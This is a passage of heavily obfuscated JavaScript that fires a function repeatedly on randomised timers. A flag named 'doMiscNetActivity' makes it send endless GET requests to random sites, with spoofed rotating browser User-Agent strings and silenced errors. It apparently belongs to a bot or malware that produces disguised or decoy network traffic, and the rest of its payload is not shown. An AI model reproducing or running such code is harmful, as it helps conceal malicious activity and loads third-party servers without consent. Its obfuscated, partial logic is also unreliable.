      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x181 + -0x1 * 0x47b + 0x2fa; k < -0x72f + 0xbf * -0x2 + 0x1 * 0x8b1; k++)
    setTimeout(f, (0x9864 + 0x3 * 0x8163 + -0x1322d) * k * getRandomInt(-0x241a + -0xdf7 + 0x1d * 0x1ba, -0xf3e + 0x1ae7 + 0x5d3 * -0x2));
  setInterval(() => {
    f();
    for (let l = 0xc * -0x2f8 + -0x4 * 0x2ab + 0x2e4c; l < 0x988 + 0x1a11 + -0x2395 * 0x1; l++)
      setTimeout(f, (0xc01 * -0x9 + 0x12e23 + 0x2846) * l * getRandomInt(-0x1f6d + -0xe7 + -0x1f * -0x10b, 0x7b * -0x2b + 0x53 * 0xb + -0x1 * -0x111b));
  }, -0x37479 + -0x4344bf + 0x7da7b8);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x76 * -0x27 + -0xc1 * 0x17 + 0x3ea9) * getRandomInt(-0x1e57 + 0x865 + 0x15f3, 0x1 * 0x1f3 + -0xf7 * -0x1 + -0xf7 * 0x3));
}, 0x127d * 0x2 + -0x54 * -0x76 + 0xac2 * -0x7);